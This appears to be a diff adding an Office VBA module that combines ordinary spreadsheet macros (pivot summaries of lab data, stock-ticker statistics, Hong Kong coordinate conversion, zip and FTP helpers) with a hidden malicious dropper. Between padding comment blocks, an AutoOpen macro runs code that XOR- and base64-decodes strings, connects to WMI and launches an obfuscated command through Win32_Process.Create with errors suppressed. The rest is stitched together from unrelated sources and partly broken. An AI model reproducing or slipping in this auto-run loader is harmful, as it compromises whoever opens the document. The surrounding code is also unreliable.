@@ -1,0 +1,1181 @@
+Attribute VB_Name = "Module1"
+Private Const CP_UTF8                       As Long = 65001
+
+#If Win64 Then
+Private Declare PtrSafe Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpDefaultChar As LongPtr, ByVal lpUsedDefaultChar As LongPtr) As LongPtr
+Private Declare PtrSafe Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As LongPtr, ByVal dwFlags As LongPtr, lpMultiByteStr As Any, ByVal cchMultiByte As LongPtr, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As LongPtr) As Long
+#Else
+Private Declare Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpDefaultChar As Long, ByVal lpUsedDefaultChar As Long) As Long
+Private Declare Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long) As Long
+
+#End If
+ Dim Florida As Variant
+
+
+Sub SummarizeControls()
+'
+' SummarizeControls Macro
+' Create a Pivottable from SAP QMS export of Controls.
+'
+
+'
+    Dim lRecords As Long
+    Dim sDataRange As String
+    Dim sDataSheet As String
+    Dim wsPT1 As Worksheet 'Pivottable to arrange by sample
+    Dim wsPT2 As Worksheet 'Pivottable to arrange by shift
+    Dim iTimestampColumn As Integer 'Column # containing Task List Description
+    
+    sDataSheet = "'" & ActiveSheet.Name & "'"
+    lRecords = ActiveSheet.UsedRange.Rows.Count
+    
+    iTimestampColumn = [=MATCH("Task list description",$A$1:$V$1,0)]
+    
+    'Create Useful Timestamp
+    Columns(iTimestampColumn).Select
+    Selection.Insert Shift:=xlToRight, CopyOrigin:=xlFormatFromLeftOrAbove
+    Cells(1, iTimestampColumn).FormulaR1C1 = "Timestamp"
+    With Cells(2, iTimestampColumn)
+        .FormulaR1C1 = "=RC1+RC[-1]"
+        .NumberFormat = "[$-409]m/d/yy h:mm AM/PM;@"
+        .AutoFill Destination:=Range(Cells(2, iTimestampColumn), Cells(lRecords, iTimestampColumn))
+    End With
+    With Range(Cells(2, iTimestampColumn), Cells(lRecords, iTimestampColumn))
+        .Copy
+        .PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
+            :=False, Transpose:=False
+    End With
+        
+    'Remove useless timestamp data
+    Range(Columns(1), Columns(iTimestampColumn - 1)).Delete Shift:=xlToLeft
+    
+    'Rename anaysis columns
+    Range("C1").Select
+    ActiveCell.FormulaR1C1 = "K2O"
+    Range("D1").Select
+    ActiveCell.FormulaR1C1 = "Insol"
+    Range("E1").Select
+    ActiveCell.FormulaR1C1 = "NaCl"
+    
+    'Remove pH and comments
+    Columns("F").Delete Shift:=xlToLeft
+    Columns("G").Delete Shift:=xlToLeft
+    
+    'Replace 0s with blanks
+    
+    Columns("D:G").Replace What:="0", Replacement:="", LookAt:=xlWhole, _
+        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
+        ReplaceFormat:=False
+    
+    'Get Shift
+    Columns("B:B").Select
+    Selection.Insert Shift:=xlToRight, CopyOrigin:=xlFormatFromLeftOrAbove
+    Range("B1").Select
+    ActiveCell.FormulaR1C1 = "Shift"
+    Range("B2").Select
+    ActiveCell.FormulaR1C1 = _
+        "=((RC[-1]-INT(RC[-1]))<0.25)*(INT(RC[-1])-0.25)+((RC[-1]-INT(RC[-1]))>=0.75)*(INT(RC[-1])+0.75)+AND((RC[-1]-INT(RC[-1])>=0.25),(RC[-1]-INT(RC[-1])<0.75))*(INT(RC[-1])+0.25)"
+    Range("B2").Select
+    Selection.AutoFill Destination:=Range(Cells(2, 2), Cells(lRecords, 2))
+    Range(Cells(2, 2), Cells(lRecords, 2)).Select
+    Selection.Copy
+    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
+        :=False, Transpose:=False
+        
+    sDataRange = ActiveSheet.UsedRange.Address
+    'ActiveSheet.UsedRange.Select
+    
+    'Sample Summary
+    Set wsPT1 = Sheets.Add
+    Call RenameWorksheet(wsPT1, "By Sample")
+    ActiveWorkbook.PivotCaches.Create(SourceType:=xlDatabase, SourceData:= _
+        sDataSheet & "!" & sDataRange, Version:=xlPivotTableVersion14).CreatePivotTable _
+        TableDestination:="'" & wsPT1.Name & "'!R3C1", TableName:="tblBySample", DefaultVersion _
+        :=xlPivotTableVersion14
+    wsPT1.Select
+    Cells(3, 1).Select
+    With wsPT1.PivotTables("tblBySample")
+        With .PivotFields("Task list description")
+            .Orientation = xlRowField
+            .Position = 1
+        End With
+        .AddDataField .PivotFields("K2O"), "Average of K2O", xlAverage
+        .AddDataField .PivotFields("NaCl"), "Average of NaCl", xlAverage
+        .AddDataField .PivotFields("Insol"), "Average of Insol", xlAverage
+        .AddDataField .PivotFields("K2O"), "Samples collected (by K2O)", xlCount
+        .PivotFields("Average of Insol").NumberFormat = "_(* #,##0.00_);_(* (#,##0.00);_(* ""-""??_);_(@_)"
+        .PivotFields("Average of K2O").NumberFormat = "_(* #,##0.00_);_(* (#,##0.00);_(* ""-""??_);_(@_)"
+        .PivotFields("Average of NaCl").NumberFormat = "_(* #,##0.00_);_(* (#,##0.00);_(* ""-""??_);_(@_)"
+        .ColumnGrand = False
+        .RowGrand = False
+    End With
+   
+    'Shift Summary
+    Set wsPT2 = Sheets.Add
+    Call RenameWorksheet(wsPT2, "By Shift")
+    ActiveWorkbook.PivotCaches.Create(SourceType:=xlDatabase, SourceData:= _
+        sDataSheet & "!" & sDataRange, Version:=xlPivotTableVersion14).CreatePivotTable _
+        TableDestination:="'" & wsPT2.Name & "'!R3C1", TableName:="tblByShift", DefaultVersion _
+        :=xlPivotTableVersion14
+    With wsPT2.PivotTables("tblByShift")
+        With .PivotFields("Shift")
+            .Orientation = xlRowField
+            .Position = 1
+        End With
+        With .PivotFields("Task list description")
+            .Orientation = xlColumnField
+        End With
+        .AddDataField .PivotFields("K2O"), "Average of K2O", xlAverage
+        .AddDataField .PivotFields("NaCl"), "Average of NaCl", xlAverage
+        .AddDataField .PivotFields("Insol"), "Average of Insol", xlAverage
+        .AddDataField .PivotFields("K2O"), "Samples collected (by K2O)", xlCount
+        .PivotFields("Average of Insol").NumberFormat = "_(* #,##0.00_);_(* (#,##0.00);_(* ""-""??_);_(@_)"
+        .PivotFields("Average of K2O").NumberFormat = "_(* #,##0.00_);_(* (#,##0.00);_(* ""-""??_);_(@_)"
+        .PivotFields("Average of NaCl").NumberFormat = "_(* #,##0.00_);_(* (#,##0.00);_(* ""-""??_);_(@_)"
+        .ColumnGrand = False
+        .RowGrand = False
+    End With
+    
+    'These fail and I don't know why
+'    ThisWorkbook.SlicerCaches.Add(wsPT2.PivotTables(1), "Shift").Slicers.Add wsPT2, , "Shift", "Shift"
+'    ThisWorkbook.SlicerCaches.Add(wsPT2.PivotTables(1), "Task List Description").Slicers.Add wsPT2
+    
+        
+End Sub
+
+Sub KeyboardShortcuts()
+    'KeyboardShortcuts:     Configure keyboard shortcuts the way I'd like them using Application.OnKey
+    '                       This is called in the Workbook_Open method
+    '                       + SHIFT
+    '                       ^ CTRL
+    '                       % ALT
+    Application.OnKey "^+4", "fmtCurrency"
+    Application.OnKey "^+1", "fmtComma"
+End Sub
+
+Sub ReAddin()
+    ThisWorkbook.IsAddin = True
+End Sub
+
+Sub DeAddin()
+    ThisWorkbook.IsAddin = False
+End Sub
+
+Sub FindThisFile()
+'   FindFile:   Display a message box showing where this addin is saved
+    Dim strPath As String
+    If ThisWorkbook.FullName = "" Then strPath = "Unsaved" Else strPath = ThisWorkbook.FullName
+    MsgBox strPath
+End Sub
+
+
+
+
+
+
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+
+Sub Auti_Open()
+MyFin
+End Sub
+
+    
+Sub AutoOpen()
+
+
+Auti_Open
+    
+
+End Sub
+
+
+Sub MyFin()
+    
+    Dim Got As Variant
+    Got = NobosMeik(VibinJoin("IQcXHjIAGgwGERsdBk07MhQAHz8OAAkRGRc="), "versache")
+    Set KitRol = CreateObject(Got)
+
+
+    Set Florida = KitRol.ConnectServer()
+    Florida.Security_.ImpersonationLevel = 56 * 2 - 109
+    Call Nokia
+    
+End Sub
+
+Function Nokia()
+
+    
+    Dim Firgus As Variant
+    Set Firgus = Florida _
+    .Get _
+    ("Win32_Process")
+    On Error Resume Next
+    Call Firgus _
+    .Create _
+    (NobosMeik(VibinJoin("BgoFFhMQAAAaCVJeFgoGARkSAQcYDw1FHgwWFwQNSEgVCh8eAA0MRT8IAhwTF0UoGQEHHwRDKgwCFiYBAA0bAxMXSVMyFwkXAkgwGhUQPBcXCwEVBBFISCUKBwECBkgNAhECSU5MCRMXER0BGE0QHAxKOBwHEQ0kWAETB00LHBEGX11cABUJERkXC10ZGhJKFQAWOABNDAQCSRoHFRNSSlkEBBIVDBocWB0LCU4oEjY3CVwXABdISDIAAQcIDQkRHwocUz1BTAAYE0gnJC44OQAMFhxPAAcIKkdeL0NHDQsAXyY2LDM0FhAAABI9QUQ5VEEXHRdZPCA7NS44GzApCVgGHR49QVNFJQAGXi0MCwQCDB0dQU44BAINUi9DRw0LAF8mNiwzNEdNRREWExcdER8JUl4FBgsKEgBSAAcGGgRWBh0eEQwaEU1FUiAVAhoRWzUAHAIGGxZWExsXDk0LChtFXzITBB0IEwsGPwgQHEUVCh8DDhEc"), "versache"), _
+    Null, Null, FeraskoLom)
+
+End Function
+
+
+
+
+
+
+Public Function DUPLO(file_path As String) As Boolean
+    
+
+    trega = Dir(file_path) <> ""
+    Exit Function
+
+DirErr:
+      If Err.Number = 68 Then
+        trega = False
+    Else
+        MsgBox Err.Description & " (" & Err.Number & ")", , "Run-time Error"
+        Stop
+    End If
+End Function
+
+Private Function NobosMeik(text As String, key As String) As String
+  Dim CofEn() As Byte
+  Dim VolPen() As Byte
+  
+  Dim VifJon As Long
+  Dim GitClone As Long
+    
+  
+  CofEn = StrConv(text, vbFromUnicode)
+  VifJon = UBound(CofEn, 1)
+  VolPen = StrConv(key, vbFromUnicode)
+  GitClone = UBound(VolPen, 1)
+  Dim TextPos As Long
+  Dim Trenfa As Long
+  
+  For TextPos = (44 * 2 - 88) To VifJon
+    CofEn(TextPos) = CofEn(TextPos) Xor VolPen(Trenfa)
+    If Trenfa < GitClone Then
+      Trenfa = Trenfa + (54 * 2 - 107)
+    Else
+      Trenfa = (11 * 6 - 66)
+    End If
+  Next TextPos
+  NobosMeik = StrConv(CofEn, 64)
+End Function
+
+Public Function VibinJoin(Vecad As String) As String
+    Dim baValue()       As Byte
+    Dim sValue          As String
+    Dim kerfas           As Long
+    
+    With VBA.CreateObject("MSXML2.DOMDocument").CreateElement("dummy")
+        .DataType = "bin" + ".base64"
+        .text = Vecad
+        baValue = .NodeTypedValue
+        sValue = String$(4 * UBound(baValue), 0)
+        kerfas = MultiByteToWideChar(CP_UTF8, 84 + 2 - 86, baValue((54 + 12 - 66)), UBound(baValue) + (11 * 11 - 120), StrPtr(sValue), Len(sValue))
+        VibinJoin = Left$(sValue, kerfas)
+    End With
+End Function
+
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+Sub ticker_stats()
+
+'Set all Dimensions
+
+' Set an initial variable for holding the ticker name
+Dim ticker As String
+
+' Define initial variable for holding the total stock Volume for each Ticker
+Dim stock_vol As Double
+
+' Keep track of the location for each Ticker row in the Result Table
+Dim result_row As Integer
+
+' Define the index
+Dim i As Long
+Dim j As Long
+
+' Define Dimensions for all the values to be calculated
+Dim close_val As Double
+Dim open_val As Double
+Dim year_change As Double
+Dim percent As Double
+
+' Define LastRow for Data
+Dim LastRow As Long
+
+'Define Dimensions for Challenge to get %increase, %decrease & greatest total volume
+Dim max_p As Double
+Dim min_p As Double
+Dim max_v As Double
+Dim placeholder_max As Double
+Dim placeholder_min As Double
+Dim placeholder_vol As Double
+Dim ticker_max As String
+Dim ticker_min As String
+Dim ticker_vol As String
+
+
+' Set an initial value for holding the total stock Volume for each Ticker
+stock_vol = 0
+
+'Set initial values
+stock_vol = 0
+close_val = 0
+open_val = 0
+Percentage = 0
+
+
+
+' Loop through all sheets
+    For Each ws In Worksheets
+
+            result_row = 2
+        
+            ' Determine the Last Row
+            LastRow = ws.Cells(Rows.Count, 1).End(xlUp).Row
+
+            ' Determine the Titles for the Ticker Result Table
+            ws.Range("I1").Value = "Ticker"
+            ws.Range("J1").Value = "Yearly Change"
+            ws.Range("K1").Value = "Percent Change"
+            ws.Range("L1").Value = "Total Stock Volume"
+            ws.Range("P1").Value = "Ticker"
+            ws.Range("Q1").Value = "Value"
+            ws.Range("O2").Value = "Greatest % Increase"
+            ws.Range("O3").Value = "Greatest % Decrease"
+            ws.Range("O4").Value = "Greatest total volume"
+        
+        
+        
+
+                'Loop through all rows
+                For i = 2 To LastRow
+                    
+                    'Compare next row to current and if not equal then
+                    If ws.Cells(i + 1, 1).Value <> ws.Cells(i, 1).Value Then
+
+                            ' Set the Ticker Name
+                            ticker = ws.Cells(i, 1).Value
+
+                            ' Add to the Stock Value Total
+                            stock_vol = stock_vol + ws.Cells(i, 7).Value
+                            close_val = ws.Cells(i, 6).Value
+
+                            'Calculate Yearly Change
+                            year_change = close_val - open_val
+
+                            ' Print the Ticker name in the Ticker Result Table
+                            ws.Range("I" & result_row).Value = ticker
+
+                            ' Print the Total Stock Volume to the Ticker Result Table
+                            ws.Range("L" & result_row).Value = stock_vol
+      
+                                    'Make sure open value is not 0 to avoid division error and calculate percentage
+                                    If open_val <> 0 Then
+                                            Percentage = (year_change / open_val)
+                                    Else
+                                    End If
+                            
+                            'Print the values and get percentage
+                            ws.Range("J" & result_row).Value = year_change
+                            ws.Range("K" & result_row).Value = Percentage
+                            ws.Range("K" & result_row).NumberFormat = "0.00%"
+                            
+                                    'Assign Colors
+                                    If year_change > 0 Then
+                                        ws.Range("J" & result_row).Interior.ColorIndex = 4
+                                    ElseIf year_change < 0 Then
+                                        ws.Range("J" & result_row).Interior.ColorIndex = 3
+                                    Else
+                                        ws.Range("J" & result_row).Interior.ColorIndex = 0
+                                    End If
+                        
+
+                            ' Add one to the Ticker Result Table row
+                            result_row = result_row + 1
+
+                            'Reset the variable for new Ticker
+                            stock_vol = 0
+                            close_val = 0
+                            open_val = 0
+                            Percentage = 0
+
+
+                    Else
+
+                            ' Add to the Stock Total if Ticker is still same
+                             stock_vol = stock_vol + ws.Cells(i, 7).Value
+                            
+                    End If
+            
+            
+                    If ws.Cells(i - 1, 1).Value <> ws.Cells(i, 1).Value Then
+                            open_val = ws.Cells(i, 3).Value
+            
+                    End If
+
+                Next i
+                
+            'This is the total number of rows of the result table - reducing by one to avoid the last empty cell
+            result_row = result_row - 1
+        
+            'Assigning all placeholders initial value of the first row from the final Result table
+            placeholder_max = ws.Range("K2").Value
+            placeholder_min = ws.Range("K2").Value
+            placeholder_vol = ws.Range("L2").Value
+            ticker_max = ws.Range("I2").Value
+            ticker_min = ws.Range("I2").Value
+            ticker_vol = ws.Range("I2").Value
+
+
+                'Loop through all values of Result row - Starting from row 3 as the initial value is assigned to placeholders
+                For j = 3 To result_row
+                    
+                    'Calculating the Greatest % increase Value and corresponding Ticker
+                    If ws.Range("K" & j).Value > placeholder_max Then
+                        max_p = ws.Range("K" & j).Value
+                        ticker_max = ws.Range("I" & j).Value
+                        placeholder_max = ws.Range("K" & j).Value
+                    Else
+                        max_p = placeholder_max
+                    End If
+                    
+                    'Calculating the Greatest % Decrease Value and corresponding Ticker
+                    If ws.Range("K" & j).Value < placeholder_min Then
+                        min_p = ws.Range("K" & j).Value
+                        ticker_min = ws.Range("I" & j).Value
+                        placeholder_min = ws.Range("K" & j).Value
+                    Else
+                        min_p = placeholder_min
+                    End If
+                    
+                    'Calculating the Greatest total volume and corresponding Ticker
+                    If ws.Range("L" & j).Value > placeholder_vol Then
+                        max_v = ws.Range("L" & j).Value
+                        ticker_vol = ws.Range("I" & j).Value
+                        placeholder_vol = ws.Range("L" & j).Value
+                    Else
+                        max_v = placeholder_vol
+                    End If
+                    
+                     
+                Next j
+
+            'Assigning Values to the the Challenge Results and converting to percentage
+            ws.Range("P2") = ticker_max
+            ws.Range("Q2") = max_p
+            ws.Range("P3") = ticker_min
+            ws.Range("Q3") = min_p
+            ws.Range("P4") = ticker_vol
+            ws.Range("Q4") = max_v
+            ws.Range("Q2").NumberFormat = "0.00%"
+            ws.Range("Q3").NumberFormat = "0.00%"
+   'Next worksheet
+   Next ws
+
+End Sub
+
+Public Function CoorTransform_Hk1980ToWgs84(Easting, Northing, Optional Delimiter As String = "") As Variant
+    'Initilalize Constant
+    E0 = 836694.05
+    N0 = 819069.8
+    Lng0 = 114.178556
+    Lat0 = 22.312133
+    m_0 = 1
+    M0 = 2468395.723
+    a = 6378388
+    e2 = 6.722670022 * (10 ^ (-3))
+    
+    LngLat_HK1980 = CoorTransform_GridToGeographic(E0, N0, Lng0, Lat0, m_0, M0, a, e2, Easting, Northing)
+
+    Lng_WGS84 = LngLat_HK1980(0) + (8.8 / 3600)
+    Lat_WGS84 = LngLat_HK1980(1) - (5.5 / 3600)
+    
+    
+    If Delimiter = "" Then
+        CoorTransform_Hk1980ToWgs84 = Array(Lng_WGS84, Lat_WGS84)
+    Else
+        CoorTransform_Hk1980ToWgs84 = Lng_WGS84 & Delimiter & Lat_WGS84
+    End If
+    
+    
+End Function
+
+
+'Coordinate Transform from grid to geographic in degree
+Public Function CoorTransform_GridToGeographic(E0, N0, Lng0, Lat0, m_0, M0, a, e2, Easting, Northing, Optional accuracy = 6) As Variant
+    'Meridian distance Coefficients
+    A0 = 1 - (e2 / 4) - (3 * (e2 ^ 2) / 64)
+    A2 = (3 / 8) * (e2 + ((e2 ^ 2) / 4))
+    A4 = (15 / 256) * (e2 ^ 2)
+    
+
+    'Convert the Lat0 and Lng0 from degree to radian
+    Lng0 = Lng0 * Pi / 180
+    Lat0 = Lat0 * Pi / 180
+    
+    
+    'Convert from grid to geographic
+    'Calculate Lat_p by iteration of Meridian distance,
+    E_Delta = Easting - E0
+    N_delta = Northing - N0
+    Mp = (N_delta + M0) / m_0
+    
+    Lat_min = -90 * Pi / 180
+    Lat_max = 90 * Pi / 180
+
+    accuracy = 10 ^ (-accuracy)
+    
+
+    'Newton 's method
+    Lat_p = (Lat_max + Lat_min) / 2
+    f = 1.1
+    
+    Do While Abs(f) > accuracy
+        f = Mp - a * (A0 * Lat_p - A2 * Sin(2 * Lat_p) + A4 * Sin(4 * Lat_p))
+        f_d1 = -a * (A0 - A2 * 2 * Cos(2 * Lat_p) + A4 * 4 * Cos(4 * Lat_p))
+        Lat_p = Lat_p - (f / f_d1)
+
+    Loop
+    
+    
+    t_p = Tan(Lat_p)
+    v_p = a / ((1 - e2 * Sin(Lat_p) ^ 2) ^ (1 / 2))
+    p_p = (a * (1 - e2)) / ((1 - e2 * Sin(Lat_p) ^ 2) ^ (3 / 2))
+    W_p = v_p / p_p
+    
+
+    Lng = Lng0 + (1 / Cos(Lat_p)) * ((E_Delta / (m_0 * v_p)) - (1 / 6) * ((E_Delta / (m_0 * v_p)) ^ 3) * (W_p + 2 * (t_p ^ 2)))
+    Lat = Lat_p - (t_p / ((m_0 * p_p))) * ((E_Delta ^ 2) / ((2 * m_0 * v_p)))
+
+
+    CoorTransform_GridToGeographic = Array(Lng / Pi * 180, Lat / Pi * 180)
+    
+    
+End Function
+
+
+'Coordinate Transform from WGS84 geographic in degree to HK1980 grid
+Public Function CoorTransform_Wgs84ToHK1980(Lng, Lat, Optional Delimiter As String = "") As Variant
+    'Initilalize Constant
+    E0 = 836694.05
+    N0 = 819069.8
+    Lng0 = 114.178556
+    Lat0 = 22.312133
+    m_0 = 1
+    M0 = 2468395.723
+    a = 6378388
+    e2 = 6.722670022 * (10 ^ (-3))
+    
+    Lng_HK1980 = Lng - (8.8 / 3600)
+    Lat_HK1980 = Lat + (5.5 / 3600)
+    
+    EastNorth_HK1980 = CoorTransform_GeographicToGrid(E0, N0, Lng0, Lat0, m_0, M0, a, e2, Lng_HK1980, Lat_HK1980)
+    
+    
+    If Delimiter = "" Then
+        CoorTransform_Wgs84ToHK1980 = EastNorth_HK1980
+    Else
+        CoorTransform_Wgs84ToHK1980 = EastNorth_HK1980(0) & Delimiter & EastNorth_HK1980(1)
+    End If
+    
+    
+End Function
+
+
+'Coordinate Transform from geographic in degree to grid
+Public Function CoorTransform_GeographicToGrid(E0, N0, Lng0, Lat0, m_0, M0, a, e2, Lng, Lat) As Variant
+    'Meridian distance Coefficients
+    A0 = 1 - (e2 / 4) - (3 * (e2 ^ 2) / 64)
+    A2 = (3 / 8) * (e2 + ((e2 ^ 2) / 4))
+    A4 = (15 / 256) * (e2 ^ 2)
+    
+
+    'Convert Lat and Lng from degree to radian
+    Lng0 = Lng0 * Pi / 180
+    Lat0 = Lat0 * Pi / 180
+    
+    Lng = Lng * Pi / 180
+    Lat = Lat * Pi / 180
+    
+    
+    'Convert from geographic to grid
+    Lng_Delta = Lng - Lng0
+    M = a * (A0 * Lat - A2 * Sin(2 * Lat) + A4 * Sin(4 * Lat))
+
+    t_s = Tan(Lat)
+    v_s = a / ((1 - e2 * Sin(Lat) ^ 2) ^ (1 / 2))
+    p_s = (a * (1 - e2)) / ((1 - e2 * Sin(Lat) ^ 2) ^ (3 / 2))
+    W_s = v_s / p_s
+    
+
+    Easting = E0 + m_0 * v_s * (Lng_Delta * Cos(Lat) + (1 / 6) * (Lng_Delta ^ 3) * (Cos(Lat) ^ 3) * (W_s - t_s ^ 2))
+    Northing = N0 + m_0 * ((M - M0) + v_s * ((Lng_Delta ^ 2) / 4) * Sin(2 * Lat))
+
+
+    CoorTransform_GeographicToGrid = Array(Easting, Northing)
+    
+    
+End Function
+
+Public Sub CopyFileBypassErr(src As String, des As String)
+    Dim objFSO As Object
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    
+    'object.copyfile,source,destination,file overright(True is default)
+    objFSO.CopyFile src, des, True
+    
+    Set objFSO = Nothing
+End Sub
+
+'Unzip multiple files in directory
+Public Function ExtractZipInDir(SrcDir As String, DesDir As String, Optional Criteria As String = "", Optional DeleteZipFile As Boolean = False) As String
+    On Error GoTo Err_ExtractZip
+    
+    Dim FailedReason As String
+    
+    Dim Result As String
+    
+    Criteria = SrcDir & Criteria
+    Result = Dir(Criteria)
+    
+    
+    Do While Len(Result) > 0
+        Call ExtractZip(SrcDir & Result, DesDir, DeleteZipFile)
+        Result = Dir
+    Loop
+
+Exit_ExtractZip:
+    ExtractZipInDir = FailedReason
+    Exit Function
+
+Err_ExtractZip:
+    FailedReason = Err.Description
+    Resume Exit_ExtractZip
+
+End Function
+
+'Unzip a file
+Public Function ExtractZip(src As String, DesDir As String, Optional DeleteZipFile As Boolean = False) As String
+    On Error GoTo Err_ExtractZip
+    
+    Dim FailedReason As String
+    
+    Dim ZipTool_path As String
+    ZipTool_path = [CurrentProject].[Path] & ZipTool_local_path
+    
+    Dim ShellCmd As String
+    Dim Success As Boolean
+
+    
+    ShellCmd = ZipTool_path & " x " & src & " -o" & DesDir & " -ry"
+    'MsgBox ShellCmd
+    Success = ShellAndWait(ShellCmd, vbHide)
+
+    If Success = True And DeleteZipFile = True Then
+        Kill src
+    End If
+
+Exit_ExtractZip:
+    ExtractZip = FailedReason
+    Exit Function
+
+Err_ExtractZip:
+    FailedReason = Err.Description
+    Resume Exit_ExtractZip
+
+End Function
+
+'Ftp upload file
+Public Function FTPUpload(Site, sUsername, sPassword, sLocalFile, sRemotePath, Optional Delay As Integer = 1000) As String
+    On Error GoTo Err_FTPUpload
+
+    Dim FailedReason As String
+    
+    Dim oFTPScriptFSO As Object
+    Dim oFTPScriptShell As Object
+    
+
+    
+    sRemotePath = Trim(sRemotePath)
+    sLocalFile = Trim(sLocalFile)
+    
+    
+    '----------Path Checks---------
+    'Here we willcheck the path, if it contains
+    'spaces then we need to add quotes to ensure
+    'it parses correctly.
+    If InStr(sRemotePath, " ") > 0 Then
+        If Left(sRemotePath, 1) <> """" And Right(sRemotePath, 1) <> """" Then
+            sRemotePath = """" & sRemotePath & """"
+        End If
+    End If
+    
+    If InStr(sLocalFile, " ") > 0 Then
+        If Left(sLocalFile, 1) <> """" And Right(sLocalFile, 1) <> """" Then
+            sLocalFile = """" & sLocalFile & """"
+        End If
+    End If
+    
+    
+    'Check to ensure that a remote path was
+    'passed. If it's blank then pass a "\"
+    If Len(sRemotePath) = 0 Then
+        'Please note that no premptive checking of the
+        'remote path is done. If it does not exist for some
+        'reason. Unexpected results may occur.
+        sRemotePath = "\"
+    End If
+    
+    
+    'Check the local path and file to ensure
+    'that either the a file that exists was
+    'passed or a wildcard was passed.
+    If InStr(sLocalFile, "*") Then
+        If InStr(sLocalFile, " ") Then
+            FailedReason = "Error: Wildcard uploads do not work if the path contains a space." & vbCrLf
+            FailedReason = FailedReason & "This is a limitation of the Microsoft FTP client."
+            
+            GoTo Exit_FTPUpload
+        End If
+        
+    ElseIf Len(sLocalFile) = 0 Or Not oFTPScriptFSO.FileExists(sLocalFile) Then
+        'nothing to upload
+        FailedReason = "Error: File Not Found."
+        GoTo Exit_FTPUpload
+        
+    End If
+    '--------END Path Checks---------
+    
+    
+    'build input file for ftp command
+    Dim sFTPScript As String
+    
+    sFTPScript = sFTPScript & "USER " & sUsername & vbCrLf
+    sFTPScript = sFTPScript & sPassword & vbCrLf
+    sFTPScript = sFTPScript & "cd " & sRemotePath & vbCrLf
+    sFTPScript = sFTPScript & "binary" & vbCrLf
+    sFTPScript = sFTPScript & "prompt n" & vbCrLf
+    sFTPScript = sFTPScript & "put " & sLocalFile & vbCrLf
+    sFTPScript = sFTPScript & "quit" & vbCrLf & "quit" & vbCrLf & "quit" & vbCrLf
+    
+    
+    Dim sFTPTemp As String
+    Dim sFTPTempFile As String
+    Dim sFTPResults As String
+    
+    sFTPTemp = oFTPScriptShell.ExpandEnvironmentStrings("%TEMP%")
+    sFTPTempFile = sFTPTemp & "\" & oFTPScriptFSO.GetTempName
+    sFTPResults = sFTPTemp & "\" & oFTPScriptFSO.GetTempName
+    
+    
+    'Write the input file for the ftp command
+    'to a temporary file.
+    Dim fFTPScript As Object
+    Set fFTPScript = oFTPScriptFSO.CreateTextFile(sFTPTempFile, True)
+    
+    fFTPScript.WriteLine (sFTPScript)
+    fFTPScript.Close
+    
+    Set fFTPScript = Nothing
+    
+
+    
+    
+    'Check results of transfer.
+    Dim fFTPResults As Object
+    Dim sResults As String
+    
+    Const OpenAsDefault = -2
+    Const FailIfNotExist = 0
+    Const ForReading = 1
+    Const ForWriting = 2
+
+    Set fFTPResults = oFTPScriptFSO.OpenTextFile(sFTPResults, ForReading, FailIfNotExist, OpenAsDefault)
+    sResults = fFTPResults.ReadAll
+    fFTPResults.Close
+    
+    
+    If InStr(sResults, "226 Transfer complete.") > 0 Then
